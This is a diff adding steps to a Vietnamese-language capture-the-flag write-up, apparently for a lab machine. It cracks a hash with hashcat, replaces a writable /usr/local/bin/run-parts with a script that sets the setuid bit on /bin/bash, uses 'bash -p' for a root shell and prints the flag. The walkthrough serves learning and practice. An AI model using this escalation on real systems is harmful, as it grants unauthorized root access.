@@ -65,4 +65,21 @@ hashcat -a 0 -m 20 hash /usr/share/wordlists/rockyou.txt
 
 ```
 - Để ý thấy có run-part đang chạy. Mà thuộc /usr/local mà saff có quyền chỉnh sửa. Sửả nó :))) 
+- Jkr thuộc nhóm staff mà staff có quyền chỉnh sửa usr/local. Đường dẫn của run-parts là usr/local/bin/run-parts.
+- Ta sử dụng shellbash để mở kết nối từ máy victim đến máy attack.
+- cd usr/local/bin/run-parts
+- nano run-parts
+    #!/bin/bash
+    
+    chmod u+s /bin/bash
+- Cấp quyền /bin/bash cho  u: owner, s = setuid
+- Lưu lại và cấp quyền thực thi cho run-parts
+    ![Image 12](image/image14.png)
+- Trên máy tấn công: đăng nhập ssh 1 lần nữa
+    ![Image 13](image/image15.png)
+- Xem quyền /bin/bash: có quyền s
+- Sử dụng /bin/bash -p để vào shellbash giữ nguyên quyền ưu tiên
+- Jkr đã thuộc nhóm root
+- cd vào thư mục root để đọc root.txt
+flag: 6cc08f85c8664c41b03fc746fced2fca
 
